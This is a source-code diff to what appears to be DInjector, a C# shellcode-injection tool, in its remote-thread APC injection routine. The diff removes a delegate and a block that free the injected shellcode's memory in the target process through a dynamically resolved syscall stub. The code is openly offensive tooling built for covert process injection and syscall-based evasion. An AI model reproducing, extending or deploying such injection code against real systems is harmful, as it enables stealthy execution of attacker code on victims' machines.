@@ -66,13 +66,6 @@ namespace DInjector
             ref uint SuspendCount);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtFreeVirtualMemory(
-            IntPtr processHandle,
-            ref IntPtr baseAddress,
-            ref IntPtr regionSize,
-            uint freeType);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate bool CloseHandle(IntPtr hObject);
 
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
@@ -240,26 +233,6 @@ namespace DInjector
                 Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");
-
-            #endregion
-
-            #region NtFreeVirtualMemory (shellcode)
-
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtFreeVirtualMemory");
-            NtFreeVirtualMemory sysNtFreeVirtualMemory = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFreeVirtualMemory));
-
-            regionSize = IntPtr.Zero;
-
-            ntstatus = sysNtFreeVirtualMemory(
-                hProcess,
-                ref baseAddress,
-                ref regionSize,
-                DI.Data.Win32.Kernel32.MEM_RELEASE);
-
-            if (ntstatus == 0)
-                Console.WriteLine("(RemoteThreadAPC) [+] NtFreeVirtualMemory");
-            else
-                Console.WriteLine($"(RemoteThreadAPC) [-] NtFreeVirtualMemory: {ntstatus}");
 
             #endregion
 
